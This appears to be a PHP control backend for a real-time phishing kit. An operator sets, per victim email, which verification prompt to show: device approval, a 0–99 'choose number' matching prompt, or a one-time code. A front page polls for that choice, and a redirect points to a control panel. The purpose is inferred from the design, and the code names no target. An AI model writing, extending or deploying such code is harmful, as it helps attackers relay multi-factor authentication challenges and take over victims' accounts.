<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");

// Simple file-based storage for verification prompts
$dataFile = '/tmp/verification_data.json';

// Initialize data file if it doesn't exist
if (!file_exists($dataFile)) {
    file_put_contents($dataFile, json_encode([]));
}

// Handle GET request - check what prompt to show
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['email']) && !isset($_GET['list'])) {
    $identifier = trim($_GET['email']);

    if (empty($identifier)) {
        echo json_encode(['error' => 'Identifier required']);
        exit;
    }

    $fileContent = @file_get_contents($dataFile);
    $data = json_decode($fileContent, true) ?: [];

    $identifierKey = md5(strtolower($identifier));

    if (isset($data[$identifierKey]) && isset($data[$identifierKey]['prompt_type'])) {
        $response = [
            'prompt_type' => $data[$identifierKey]['prompt_type'],
            'timestamp' => $data[$identifierKey]['timestamp']
        ];

        if ($data[$identifierKey]['prompt_type'] === 'choose_number' && isset($data[$identifierKey]['number'])) {
            $response['number'] = $data[$identifierKey]['number'];
        }

        echo json_encode($response);
    } else {
        echo json_encode(['prompt_type' => null]);
    }
    exit;
}

// Handle POST request - set verification prompt
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $identifier = isset($_POST['identifier']) ? trim($_POST['identifier']) : '';
    $promptType = isset($_POST['prompt_type']) ? trim($_POST['prompt_type']) : '';

    if (empty($identifier) || empty($promptType)) {
        echo json_encode(['error' => 'Identifier and prompt_type required']);
        exit;
    }

    if (!in_array($promptType, ['device_verify', 'choose_number', 'otp'])) {
        echo json_encode(['error' => 'Invalid prompt_type']);
        exit;
    }

    $fileContent = @file_get_contents($dataFile);
    $data = json_decode($fileContent, true) ?: [];

    $identifierKey = md5(strtolower($identifier));

    $verificationData = [
        'identifier' => $identifier,
        'prompt_type' => $promptType,
        'timestamp' => time()
    ];

    if ($promptType === 'choose_number') {
        $number = isset($_POST['number']) ? trim($_POST['number']) : '';
        if ($number === '') {
            echo json_encode(['error' => 'Number required for choose_number prompt']);
            exit;
        }

        if (!is_numeric($number) || strlen($number) < 1 || strlen($number) > 2 || $number < 0 || $number > 99) {
            echo json_encode(['error' => 'Must provide a number between 0-99']);
            exit;
        }

        $verificationData['number'] = (int)$number;
    }

    $data[$identifierKey] = $verificationData;

    file_put_contents($dataFile, json_encode($data, JSON_PRETTY_PRINT));

    echo json_encode(['success' => true, 'message' => 'Verification prompt set']);
    exit;
}

// Handle DELETE request - clear verification prompt
if ($_SERVER['REQUEST_METHOD'] === 'DELETE') {
    $identifier = isset($_GET['email']) ? trim($_GET['email']) : '';

    if (empty($identifier)) {
        echo json_encode(['error' => 'Identifier required']);
        exit;
    }

    $fileContent = @file_get_contents($dataFile);
    $data = json_decode($fileContent, true) ?: [];

    $identifierKey = md5(strtolower($identifier));

    if (isset($data[$identifierKey])) {
        unset($data[$identifierKey]);
        file_put_contents($dataFile, json_encode($data, JSON_PRETTY_PRINT));
        echo json_encode(['success' => true, 'message' => 'Verification prompt cleared']);
    } else {
        echo json_encode(['error' => 'No verification prompt found for this identifier']);
    }
    exit;
}

// Redirect to control panel for UI
if ($_SERVER['REQUEST_METHOD'] === 'GET' && !isset($_GET['email']) && !isset($_GET['list'])) {
    header('Location: control.html');
    exit;
}

// Handle list all request
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['list']) && $_GET['list'] === 'all') {
    $fileContent = @file_get_contents($dataFile);
    $data = json_decode($fileContent, true) ?: [];

    // Clean up old entries (older than 1 hour)
    $currentTime = time();
    foreach ($data as $key => $item) {
        if (($currentTime - $item['timestamp']) > 3600) {
            unset($data[$key]);
        }
    }

    @file_put_contents($dataFile, json_encode($data, JSON_PRETTY_PRINT));

    echo json_encode($data);
    exit;
}
?>